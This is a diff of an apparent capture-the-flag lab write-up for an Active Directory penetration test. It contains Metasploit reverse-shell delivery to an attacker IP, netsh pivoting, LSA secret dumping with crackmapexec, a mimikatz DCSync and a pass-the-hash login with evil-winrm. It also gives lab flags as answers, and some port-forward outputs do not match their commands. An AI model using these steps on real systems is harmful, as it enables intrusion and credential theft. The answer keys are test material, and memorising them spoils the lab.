@@ -18,40 +18,7 @@ A team member started an External Penetration Test and was moved to another urge
         payload => windows/x64/meterpreter/reverse_tcp
         [msf](Jobs:0 Agents:0) exploit(multi/script/web_delivery) >> set SRVHOST 10.10.15.162  # attacker IP
         [msf](Jobs:0 Agents:0) exploit(multi/script/web_delivery) >> set LHOST 10.10.15.162
-        [msf](Jobs:0 Agents:0) exploit(multi/script/web_delivery) >> options
-
-        Module options (exploit/multi/script/web_delivery):
-
-        Name     Current Setting  Required  Description
-        ----     ---------------  --------  -----------
-        SRVHOST  10.10.15.162     yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
-        SRVPORT  9999             yes       The local port to listen on.
-        SSL      false            no        Negotiate SSL for incoming connections
-        SSLCert                   no        Path to a custom SSL certificate (default is randomly generated)
-        URIPATH                   no        The URI to use for this exploit (default is random)
-
-
-        Payload options (windows/x64/meterpreter/reverse_tcp):
-
-        Name      Current Setting  Required  Description
-        ----      ---------------  --------  -----------
-        EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
-        LHOST     10.10.15.162     yes       The listen address (an interface may be specified)
-        LPORT     4444             yes       The listen port
-
-
-        Exploit target:
-
-        Id  Name
-        --  ----
-        2   PSH
-
-
-
-        View the full module info with the info, or info -d command.
-
         [msf](Jobs:0 Agents:0) exploit(multi/script/web_delivery) >> set TARGET 2
-        TARGET => 2
         [msf](Jobs:0 Agents:0) exploit(multi/script/web_delivery) >> exploit
         [*] Exploit running as background job 2.
         [*] Exploit completed, but no session was created.
@@ -140,7 +107,7 @@ A team member started an External Penetration Test and was moved to another urge
         (Meterpreter 1)(C:\Windows\system32) > getuid
         Server username: NT AUTHORITY\SYSTEM
         ```
-   - Upload PowerView module and enumerate SPN accounts, check the `serviceprincipalname` value for the requested SPN and read the `samaccountname`:
+   - Upload PowerView module and enumerate SPN accounts, check the `serviceprincipalname` value for the requested SPN and read the `samaccountname` ([PowerView.ps1](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1)):
         ```pwsh
         (Meterpreter 1)(C:\Windows\system32) > upload /home/htb-ac-1863259/PowerView.ps1 C:\PowerView.ps1
         [*] Uploading  : /home/htb-ac-1863259/PowerView.ps1 -> C:PowerView.ps1
@@ -232,99 +199,264 @@ A team member started an External Penetration Test and was moved to another urge
 
         <SNIP>
         ```
-4. Submit the contents of the flag.txt file on the Administrator desktop on MS01. **Answer:**
+4. Submit the contents of the flag.txt file on the Administrator desktop on MS01. **Answer: spn$_r0ast1ng_on_@n_0p3n_f1re**
    - Identify other reachable host in the internal network:
-          ```
-          PS C:\> ipconfig
-          ipconfig
+      ```pwsh
+      PS C:\> ipconfig
+      ipconfig
 
-          Windows IP Configuration
+      Windows IP Configuration
 
 
-          Ethernet adapter Ethernet1:
+      Ethernet adapter Ethernet1:
 
-          Connection-specific DNS Suffix  . : 
-          Link-local IPv6 Address . . . . . : fe80::190a:a2fa:db2d:adf8%7
-          IPv4 Address. . . . . . . . . . . : 172.16.6.100
-          Subnet Mask . . . . . . . . . . . : 255.255.0.0
-          Default Gateway . . . . . . . . . : 172.16.6.1
+      Connection-specific DNS Suffix  . : 
+      Link-local IPv6 Address . . . . . : fe80::190a:a2fa:db2d:adf8%7
+      IPv4 Address. . . . . . . . . . . : 172.16.6.100
+      Subnet Mask . . . . . . . . . . . : 255.255.0.0
+      Default Gateway . . . . . . . . . : 172.16.6.1
 
-          Ethernet adapter Ethernet0:
+      Ethernet adapter Ethernet0:
 
-          Connection-specific DNS Suffix  . : .htb
-          IPv6 Address. . . . . . . . . . . : dead:beef::1549:d44:aeaa:3c55
-          Link-local IPv6 Address . . . . . : fe80::1549:d44:aeaa:3c55%3
-          IPv4 Address. . . . . . . . . . . : 10.129.202.242
-          Subnet Mask . . . . . . . . . . . : 255.255.0.0
-          Default Gateway . . . . . . . . . : fe80::250:56ff:feb0:777b%3
-                                             10.129.0.1
-          PS C:\> exit
-          exit
+      Connection-specific DNS Suffix  . : .htb
+      IPv6 Address. . . . . . . . . . . : dead:beef::1549:d44:aeaa:3c55
+      Link-local IPv6 Address . . . . . : fe80::1549:d44:aeaa:3c55%3
+      IPv4 Address. . . . . . . . . . . : 10.129.202.242
+      Subnet Mask . . . . . . . . . . . : 255.255.0.0
+      Default Gateway . . . . . . . . . : fe80::250:56ff:feb0:777b%3
+                                         10.129.0.1
+      PS C:\> exit
+      exit
 
-          C:\>exit
-          exit
-          (Meterpreter 1)(C:\) > run post/multi/gather/ping_sweep RHOSTS=172.16.6.0/24
-          [*] Performing ping sweep for IP range 172.16.6.0/24
-          [+] 	172.16.6.3 host found
-          [+] 	172.16.6.50 host found
-          [+] 	172.16.6.100 host found
-          ```
+      C:\>exit
+      exit
+      (Meterpreter 1)(C:\) > run post/multi/gather/ping_sweep RHOSTS=172.16.6.0/24
+      [*] Performing ping sweep for IP range 172.16.6.0/24
+      [+] 	172.16.6.3 host found
+      [+] 	172.16.6.50 host found
+      [+] 	172.16.6.100 host found
+      ```
    - Identify the hostname of the machine at a specific IP to identify MS01:
-          ```pwsh
-          C:\>ping -a 172.16.6.50
-          ping -a 172.16.6.50
+      ```pwsh
+      C:\>ping -a 172.16.6.50
+      ping -a 172.16.6.50
 
-          Pinging MS01 [172.16.6.50] with 32 bytes of data:
-          Reply from 172.16.6.50: bytes=32 time<1ms TTL=128
-          Reply from 172.16.6.50: bytes=32 time<1ms TTL=128
-          Reply from 172.16.6.50: bytes=32 time=5ms TTL=128
-          Reply from 172.16.6.50: bytes=32 time=1ms TTL=128
+      Pinging MS01 [172.16.6.50] with 32 bytes of data:
+      Reply from 172.16.6.50: bytes=32 time<1ms TTL=128
+      Reply from 172.16.6.50: bytes=32 time<1ms TTL=128
+      Reply from 172.16.6.50: bytes=32 time=5ms TTL=128
+      Reply from 172.16.6.50: bytes=32 time=1ms TTL=128
 
-          Ping statistics for 172.16.6.50:
-          Packets: Sent = 4, Received = 4, Lost = 0 (0% loss),
-          Approximate round trip times in milli-seconds:
-          Minimum = 0ms, Maximum = 5ms, Average = 1ms
+      Ping statistics for 172.16.6.50:
+      Packets: Sent = 4, Received = 4, Lost = 0 (0% loss),
+      Approximate round trip times in milli-seconds:
+      Minimum = 0ms, Maximum = 5ms, Average = 1ms
 
-          ```
-   - Set up a meterpreter tunneling to tunnel traffic from attack host through this vulnerable web host to the target MS01:
-          ```sh
-          (Meterpreter 1)(C:\) > run autoroute -s 172.16.6.0/24
-          [!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
-          [!] Example: run post/multi/manage/autoroute OPTION=value [...]
-          [*] Adding a route to 172.16.6.0/255.255.255.0...
-          [+] Added route to 172.16.6.0/255.255.255.0 via 10.129.202.242
-          [*] Use the -p option to list all active routes
-          (Meterpreter 1)(C:\) > run autoroute -p
-          [!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
-          [!] Example: run post/multi/manage/autoroute OPTION=value [...]
+      ```
+   - Access the share at MS01 and read the flag:
+      ```pwsh
+      PS C:\windows\system32\inetsrv> net use \\MS01\c$ /user:INLANEFREIGHT.LOCAL\svc_sql lucky7
+      net use \\MS01\c$ /user:INLANEFREIGHT.LOCAL\svc_sql lucky7
+      The command completed successfully.
 
-          Active Routing Table
-          ====================
-
-          Subnet             Netmask            Gateway
-          ------             -------            -------
-          172.16.6.0         255.255.255.0      Session 1
-
-          (Meterpreter 1)(C:\) > background
-          [*] Backgrounding session 1...
-          [msf](Jobs:1 Agents:2) exploit(multi/script/web_delivery) >> use auxiliary/server/socks_proxy
-          [msf](Jobs:1 Agents:2) auxiliary(server/socks_proxy) >> set SRVPORT 9050
-          SRVPORT => 9050
-          [msf](Jobs:1 Agents:2) auxiliary(server/socks_proxy) >> set SRVHOST 0.0.0.0
-          SRVHOST => 0.0.0.0
-          [msf](Jobs:1 Agents:2) auxiliary(server/socks_proxy) >> set version 4a
-          version => 4a
-          [msf](Jobs:1 Agents:2) auxiliary(server/socks_proxy) >> run
-          [*] Auxiliary module running as background job 1.
-
-          [msf](Jobs:2 Agents:2) auxiliary(server/socks_proxy) >> [*] Starting the SOCKS proxy server
-
-          ```
-   - 
+      PS C:\windows\system32\inetsrv> type \\MS01\c$\Users\Administrator\Desktop\flag.txt
+      type \\MS01\c$\Users\Administrator\Desktop\flag.txt
+      spn$_r0ast1ng_on_@n_0p3n_f1re
+      ```
 5. Find cleartext credentials for another domain user. Submit the username as your answer. **Answer:**
-6. Submit this user's cleartext password. **Answer:**
-7. What attack can this user perform? **Answer:**
-8. Take over the domain and submit the contents of the flag.txt file on the Administrator Desktop on DC01. **Answer:**
+   - From the web shell, perform portforwarding to forward all traffic from attack host to `172.16.6.50:445` through `10.129.202.242:8888`:
+        ```pwsh
+        PS C:\windows\system32\inetsrv> netsh.exe interface portproxy add v4tov4 listenport=8888 listenaddress=10.129.202.242 connectport=445 connectaddress=172.16.6.50
+        netsh.exe interface portproxy add v4tov4 listenport=8888 listenaddress=10.129.202.242 connectport=445 connectaddress=172.16.6.50
+
+        PS C:\windows\system32\inetsrv> netsh.exe interface portproxy show v4tov4
+        netsh.exe interface portproxy show v4tov4
+
+        Listen on ipv4:             Connect to ipv4:
+
+        Address         Port        Address         Port
+        --------------- ----------  --------------- ----------
+        10.129.202.242  8888        172.16.6.50     445
+        ```
+   - From attack host, use crackmapexec to dump LSA secrets exposing `tpetty` to have cleartext credentials stored:
+        ```sh
+        $ crackmapexec smb 10.129.202.242 --port 8888 -u svc_sql -p lucky7 --lsa
+        SMB         10.129.202.242  8888   MS01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:MS01) (domain:INLANEFREIGHT.LOCAL) (signing:False) (SMBv1:False)
+        SMB         10.129.202.242  8888   MS01             [+] INLANEFREIGHT.LOCAL\svc_sql:lucky7 (Pwn3d!)
+        SMB         10.129.202.242  8888   MS01             [+] Dumping LSA secrets
+        SMB         10.129.202.242  8888   MS01             INLANEFREIGHT.LOCAL/tpetty:$DCC2$10240#tpetty#685decd67a67f5b6e45a182ed076d801: (2022-04-29 17:46:50+00:00)
+        SMB         10.129.202.242  8888   MS01             INLANEFREIGHT.LOCAL/svc_sql:$DCC2$10240#svc_sql#acc5441d637ce6aabf3a3d9d4f8137fb: (2026-04-20 03:14:37+00:00)
+        SMB         10.129.202.242  8888   MS01             INLANEFREIGHT.LOCAL/Administrator:$DCC2$10240#Administrator#9553faad97c2767127df83980f3ac245: (2022-04-20 10:25:07+00:00)
+        SMB         10.129.202.242  8888   MS01             INLANEFREIGHT\MS01$:aes256-cts-hmac-sha1-96:99f5a233d80ef917ad582132326cade15ac17787b13229b72d37b4955780a4d9
+        SMB         10.129.202.242  8888   MS01             INLANEFREIGHT\MS01$:aes128-cts-hmac-sha1-96:564ed6b8385d4e8fcca3c19ddfdf0c20
+        SMB         10.129.202.242  8888   MS01             INLANEFREIGHT\MS01$:des-cbc-md5:402697bf0b7c5d2c
+        SMB         10.129.202.242  8888   MS01             INLANEFREIGHT\MS01$:plain_password_hex:792a41895d77cff8e29472dd51216df1877b1cdcaa1258066210af6016de801cea6f5f089f58ea95ac9255af281acaa0b08a9b287adefa2dc2126f0eb9bc247cec7e4bdcb32925951da3275abf73511db944d8e58db3fe903725cf514f55971e816a7205eb82cc1f0253f3386ccc12c6301a2cd31a8dcb1b95b77e6d0842cb2058aad5c927ba7897f3011d0220778997cecabc3df155b37a7ced881555b9da56c20b7ab98ad0cd5d88b445eba0f084fa0a7a93f55410be544e8b2a74c412f6bad2c21d835e0efee2772c6199a674cb315b90835b42986de6e3f6533a901a0185afb898e88f363ba41bfba2b1ed32cb5b
+        SMB         10.129.202.242  8888   MS01             INLANEFREIGHT\MS01$:aad3b435b51404eeaad3b435b51404ee:94a6f52d34f3e6be2def88254740642d:::
+        SMB         10.129.202.242  8888   MS01             INLANEFREIGHT\tpetty:Sup3rS3cur3D0m@inU2eR
+        SMB         10.129.202.242  8888   MS01             dpapi_machinekey:0x8dbe842a7352000be08ef80e32bb35609e7d1786
+        dpapi_userkey:0xb20d199f3d953f7977a6363a69a9fe21d97ecd19
+        SMB         10.129.202.242  8888   MS01             NL$KM:a2529d310bb71c7545d64b76412dd321c65cdd0424d307ffca5cf4e5a03894149164fac791d20e027ad65253b4f4a96f58ca7600dd39017dc5f78f4bab1edc63
+        SMB         10.129.202.242  8888   MS01             [+] Dumped 11 LSA secrets to /home/htb-ac-1863259/.nxc/logs/MS01_10.129.202.242_2026-04-19_223032.secrets and /home/htb-ac-1863259/.nxc/logs/MS01_10.129.202.242_2026-04-19_223032.cached
+        ```
+6. Submit this user's cleartext password. **Answer: Sup3rS3cur3D0m@inU2eR**
+   - Read in the above tool output:
+        ```sh
+        SMB         10.129.202.242  8888   MS01             INLANEFREIGHT\tpetty:Sup3rS3cur3D0m@inU2eR
+        ```
+7. What attack can this user perform? **Answer: DCSync**
+   - Enumerate tpetty permissions:
+        ```pwsh
+        PS C:\> Get-DomainUser -Identity tpetty  |select samaccountname,objectsid,memberof,useraccountcontrol |fl
+
+        Get-DomainUser -Identity tpetty  |select samaccountname,objectsid,memberof,useraccountcontrol |fl
 
 
+        samaccountname     : tpetty
+        objectsid          : S-1-5-21-2270287766-1317258649-2146029398-4607
+        memberof           : 
+        useraccountcontrol : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
 
+
+        PS C:\> $sid="S-1-5-21-2270287766-1317258649-2146029398-4607"
+        $sid="S-1-5-21-2270287766-1317258649-2146029398-4607"
+        PS C:\> Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl
+        Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl
+
+
+        AceQualifier          : AccessAllowed
+        ObjectDN              : DC=INLANEFREIGHT,DC=LOCAL
+        ActiveDirectoryRights : ExtendedRight
+        SecurityIdentifier    : S-1-5-21-2270287766-1317258649-2146029398-4607
+        ObjectAceType         : DS-Replication-Get-Changes-In-Filtered-Set
+
+        AceQualifier          : AccessAllowed
+        ObjectDN              : DC=INLANEFREIGHT,DC=LOCAL
+        ActiveDirectoryRights : ExtendedRight
+        SecurityIdentifier    : S-1-5-21-2270287766-1317258649-2146029398-4607
+        ObjectAceType         : DS-Replication-Get-Changes
+
+        AceQualifier          : AccessAllowed
+        ObjectDN              : DC=INLANEFREIGHT,DC=LOCAL
+        ActiveDirectoryRights : ExtendedRight
+        SecurityIdentifier    : S-1-5-21-2270287766-1317258649-2146029398-4607
+        ObjectAceType         : DS-Replication-Get-Changes-All
+        ```
+   - These rights allow `tpetty` to perform DCSync attacks:
+        ```pwsh
+        ObjectAceType         : DS-Replication-Get-Changes-In-Filtered-Set
+        ObjectAceType         : DS-Replication-Get-Changes
+        ObjectAceType         : DS-Replication-Get-Changes-All
+        ```
+8. Take over the domain and submit the contents of the flag.txt file on the Administrator Desktop on DC01. **Answer: r3plicat1on_m@st3r!**
+   - Port forward to RDP into the MS01 machine:
+        ```pwsh
+        PS C:\Windows\system32> netsh.exe interface portproxy add v4tov4 listenport=8000 listenaddress=10.129.70.88 connectport=5985 connectaddress=172.16.6.3
+        netsh.exe interface portproxy add v4tov4 listenport=8000 listenaddress=10.129.70.88 connectport=5985 connectaddress=172.16.6.3
+
+        PS C:\Windows\system32> netsh.exe interface portproxy show v4tov4
+        netsh.exe interface portproxy show v4tov4
+
+        Listen on ipv4:             Connect to ipv4:
+
+        Address         Port        Address         Port
+        --------------- ----------  --------------- ----------
+        10.129.70.88    8888        172.16.6.50     3389
+        ```
+   - RDP into the MS01 machine using `svc_sql`:`lucky7` (with mimikatz.exe installed in the Downloads directory):
+        ```pwsh
+        $ xfreerdp /v:10.129.70.88:8888 /u:svc_sql /p:lucky7 /drive:share,/home/htb-ac-1863259/Downloads
+        ```
+   - On an elevated shell run mimikatz to perform DCSync attack and obtain the administrator NTLM hash:
+        ```pwsh
+        PS C:\> cd \\tsclient\share
+        PS Microsoft.PowerShell.Core\FileSystem::\\tsclient\share> ./mimikatz.exe
+
+        .#####.   mimikatz 2.2.0 (x64) #18362 Feb 29 2020 11:13:36
+        .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+        ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+        ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
+        '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+        '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/
+
+        mimikatz # privilege::debug
+        Privilege '20' OK
+
+        mimikatz # lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator
+        [DC] 'INLANEFREIGHT.LOCAL' will be the domain
+        [DC] 'DC01.INLANEFREIGHT.LOCAL' will be the DC server
+        [DC] 'INLANEFREIGHT\administrator' will be the user account
+
+        Object RDN           : Administrator
+
+        ** SAM ACCOUNT **
+
+        SAM Username         : Administrator
+        Account Type         : 30000000 ( USER_OBJECT )
+        User Account Control : 00000200 ( NORMAL_ACCOUNT )
+        Account expiration   :
+        Password last change : 4/11/2022 9:24:49 PM
+        Object Security ID   : S-1-5-21-2270287766-1317258649-2146029398-500
+        Object Relative ID   : 500
+
+        Credentials:
+        Hash NTLM: 27dedb1dab4d8545c6e1c66fba077da0
+        ntlm- 0: 27dedb1dab4d8545c6e1c66fba077da0
+        ntlm- 1: bdaffbfe64f1fc646a3353be1c2c3c99
+        lm  - 0: 757743529af55e110994f3c7e3710fc9
+        ```
+   - Identify DC open ports to try to perform a PtH attack → WinRM open:
+        ```
+        [msf](Jobs:1 Agents:1) exploit(multi/script/web_delivery) >> use auxiliary/scanner/portscan/tcp
+        [msf](Jobs:1 Agents:1) auxiliary(scanner/portscan/tcp) >> set RHOSTS 10.16.6.3
+        RHOSTS => 10.16.6.3
+        [msf](Jobs:1 Agents:1) auxiliary(scanner/portscan/tcp) >> exploit
+        ^C[*] 10.16.6.3             - Caught interrupt from the console...
+        [*] Auxiliary module execution completed
+        [msf](Jobs:1 Agents:1) auxiliary(scanner/portscan/tcp) >> set RHOSTS 172.16.6.3
+        RHOSTS => 172.16.6.3
+        [msf](Jobs:1 Agents:1) auxiliary(scanner/portscan/tcp) >> exploit
+        <SNIP>
+        [+] 172.16.6.3            - 172.16.6.3:5985 - TCP OPEN
+        <SNIP>
+        ```
+   - Same as before, port forward to access WinRM port from attack host:
+        ```pwsh
+        PS C:\Windows\system32> netsh.exe interface portproxy add v4tov4 listenport=8000 listenaddress=10.129.70.88 connectport=5985 connectaddress=172.16.6.3
+        netsh.exe interface portproxy add v4tov4 listenport=8000 listenaddress=10.129.70.88 connectport=5985 connectaddress=172.16.6.3
+
+        PS C:\Windows\system32> netsh.exe interface portproxy show v4tov4
+        netsh.exe interface portproxy show v4tov4
+
+        Listen on ipv4:             Connect to ipv4:
+
+        Address         Port        Address         Port
+        --------------- ----------  --------------- ----------
+        10.129.70.88    8888        172.16.6.50     3389
+        10.129.70.88    8000        172.16.6.3      5985
+        ```
+   - Then use evil-winrm to perform PtH attack and read the flag:
+        ```pwsh
+        $ evil-winrm -i 10.129.70.88 --port 8000 -u administrator -H 27dedb1dab4d8545c6e1c66fba077da0
+                                                
+        Evil-WinRM shell v3.5
+                                                
+        Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+                                                
+        Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                                
+        Info: Establishing connection to remote endpoint
+        *Evil-WinRM* PS C:\Users\Administrator> cd Desktop
+        *Evil-WinRM* PS C:\Users\Administrator\Desktop> dir
+
+
+        Directory: C:\Users\Administrator\Desktop
+
+
+        Mode                LastWriteTime         Length Name
+        ----                -------------         ------ ----
+        -a----        4/11/2022   7:17 PM             19 flag.txt
+
+
+        *Evil-WinRM* PS C:\Users\Administrator\Desktop> more flag.txt
+        r3plicat1on_m@st3r!
+        ```
